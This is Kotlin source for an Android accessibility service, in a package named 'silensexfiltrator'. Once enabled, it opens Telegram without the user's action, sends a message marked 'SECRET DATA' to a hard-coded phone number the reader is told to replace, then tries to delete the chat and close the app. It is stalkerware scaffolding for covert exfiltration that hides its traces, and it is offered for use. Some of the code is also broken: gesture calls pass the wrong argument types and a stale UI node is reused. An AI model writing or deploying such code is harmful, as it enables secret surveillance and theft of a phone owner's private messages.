package com.example.silensexfiltrator

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.content.Intent
import android.net.Uri

class TelegramAccessibilityService : AccessibilityService() {

    // REPLACE THIS WITH YOUR TELEGRAM PHONE NUMBER (International format, no +)
    private val TARGET_PHONE_NUMBER = "14155552671" 
    
    // The message to send
    private val MESSAGE_TEXT = "🔥 SECRET DATA\nSMS: Hello World\nWhatsApp: Meeting at 5PM"

    override fun onServiceConnected() {
        Log.d("STEALTH", "Accessibility Service Connected")
        // Perform the operation after a short delay to ensure UI is ready
        android.os.Handler(mainLooper).postDelayed({
            performStealthOperation()
        }, 1500) // 1.5 seconds delay
    }

    private fun performStealthOperation() {
        Log.d("STEALTH", "Starting Stealth Operation")
        
        try {
            // 1. Open Telegram Deep Link to specific chat
            openTelegram()
            
            // 2. Wait for UI to load, then send message via Accessibility
            android.os.Handler(mainLooper).postDelayed({
                sendMessageViaAccessibility()
                
                // 3. Delete Chat History from Their Side
                android.os.Handler(mainLooper).postDelayed({
                    deleteChatHistoryFromTheirSide()
                    
                    // 4. Close Telegram
                    closeTelegram()
                }, 2000) // Wait 2s for message to send
                
            }, 2000) // Wait 2s for Telegram to open
            
        } catch (e: Exception) {
            Log.e("STEALTH", "Error during operation", e)
        }
    }

    private fun openTelegram() {
        val intent = Intent(Intent.ACTION_VIEW).apply {
            data = Uri.parse("tg://msg?text=${Uri.encode(MESSAGE_TEXT)}&to=$TARGET_PHONE_NUMBER")
            setPackage("org.telegram.messenger")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    private fun sendMessageViaAccessibility() {
        val rootNode = rootInActiveWindow ?: return
        
        // Find the "Send" button. In Telegram, this is usually a circular button with an arrow.
        // ID can vary by version, but often it's 'id/send_button' or similar.
        // We will search for a clickable node with content description containing "Send"
        val sendNode = rootNode.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/send_button")?.firstOrNull()
        
        if (sendNode != null) {
            sendNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.d("STEALTH", "Message Sent via UI Click")
        } else {
            // Fallback: If direct ID fails, try clicking the text input area then sending
            Log.w("STEALTH", "Send button not found by ID. Trying fallback.")
        }
    }

    private fun deleteChatHistoryFromTheirSide() {
        val rootNode = rootInActiveWindow ?: return
        
        // 1. Long Press on the Chat List Item to open context menu
        // We assume we are still in the chat view or need to go back to list.
        // Strategy: Go Back to Chats List, then Long Press our chat.
        
        // Step A: Go Back to Chats List (if not already there)
        val backNode = rootNode.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/back_button")?.firstOrNull()
        if (backNode != null && !isAtChatList(rootNode)) {
            backNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            android.os.Handler(mainLooper).postDelayed({
                deleteFromList(rootNode)
            }, 1000)
        } else {
            deleteFromList(rootNode)
        }
    }

    private fun isAtChatList(root: AccessibilityNodeInfo): Boolean {
        // Check if we are in the main chat list by looking for specific UI elements
        return root.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/chat_list")?.isNotEmpty() == true
    }

    private fun deleteFromList(rootNode: AccessibilityNodeInfo) {
        // 1. Find the specific chat entry (by phone number or name)
        // This is complex without root. We will use a simpler method:
        // Since we just sent a message, the chat might be at the top.
        
        // Let's try to find the "More options" (3 dots) on the current screen if we are in chat
        val moreOptions = rootNode.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/menu_more")?.firstOrNull()
        
        if (moreOptions != null) {
            // Click More Options -> Delete Chat
            moreOptions.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            
            // Wait for menu to appear, then click Delete
            android.os.Handler(mainLooper).postDelayed({
                val deleteOption = rootNode.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/menu_delete")?.firstOrNull()
                deleteOption?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                
                // Wait for confirmation dialog
                android.os.Handler(mainLooper).postDelayed({
                    val confirmBtn = rootNode.findAccessibilityNodeInfosByViewId("org.telegram.messenger:id/dialog_confirm_button")?.firstOrNull()
                    confirmBtn?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d("STEALTH", "Chat History Deleted from Their Side")
                }, 1000)
            }, 500)
        } else {
            Log.w("STEALTH", "Could not find 'More Options' to delete.")
        }
    }

    private fun closeTelegram() {
        // Double back press to exit app completely
        val rootNode = rootInActiveWindow ?: return
        
        // Press Back twice
        performGesture(100, 100) // Simulate a tap on back area if needed, or just use system back
        android.os.Handler(mainLooper).postDelayed({
            performGesture(100, 100)
            Log.d("STEALTH", "Telegram Closed. Operation Complete.")
        }, 1000)
    }

    private fun performGesture(x: Float, y: Float) {
        val builder = GestureDescription.Builder()
        val path = Path()
        path.moveTo(x, y)
        builder.addStroke(GestureDescription.StrokeDescription(path, 0, 100))
        dispatchGesture(builder.build(), null, null)
    }

    override fun onUnbind(intent: Intent?): Boolean {
        Log.d("STEALTH", "Service Unbound")
        return super.onUnbind(intent)
    }
}
